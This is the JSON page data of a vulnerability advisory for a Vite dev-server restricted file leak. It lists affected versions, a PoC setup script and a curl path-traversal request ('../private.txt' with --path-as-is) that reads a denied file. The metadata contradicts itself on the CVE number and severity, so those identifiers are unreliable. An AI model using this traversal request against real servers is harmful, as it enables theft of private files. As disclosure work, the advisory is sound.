{"hash":"9ab1e1846eb4294308a6f2381bb1061a9ff99b27","data":{"post":{"title":"Vite arbitrary restricted remote file leak","path":"/vulnerabilities/vite-arbitrary-private-file-leak/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>Vite arbitrary restricted remote file leak</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p><a href=\"https://www.npmjs.com/package/vite\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">vite</a></p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>>=7.1.0,&#x3C;=7.1.4</p>\n<p>>=7.0.0,&#x3C;=7.0.6</p>\n<p>>=6.0.0,&#x3C;=6.3.5</p>\n<p>&#x3C;=5.4.19</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>This vulnerability allows a remote attacker to leak files outside of the public directory, assuming the path of the filename to leak has the same prefix as the public directory path.</p>\n<p>For example -</p>\n<p>Public directory - <code>/www/p</code></p>\n<p>File to leak - <code>/www/private.txt</code></p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<p>Execute the following shell commands: (Note that the publicDir is <code>p</code>)</p>\n<pre><code>npm create vite@latest\ncd vite-project/\nmkdir p\ncd p\nln -s a b\ncd ..\necho 'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({publicDir: path.resolve(__dirname, \"p/\"), server: {fs: {deny: [path.resolve(__dirname, \"private.txt\")]}}})' > vite.config.js\necho \"secret\" > private.txt\nnpm install\nnpm run dev\n</code></pre>\n<p>Then, in a different shell, run the following command:</p>\n<pre><code>curl -v --path-as-is 'http://localhost:5173/../private.txt'\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this vulnerability </p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/vitejs/vite/pull/20735\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Fix PR</a></p>\n","description":"CVE-2025-58752, CRITICAL, Vite restricted file leak","date_published":"2025-09-15","xray_id":"","vul_id":"CVE-2025-58751","severity":"high","discovered_by":"Ori Hollander","last_updated":"2025-09-15","cvss":7.5}},"context":{}}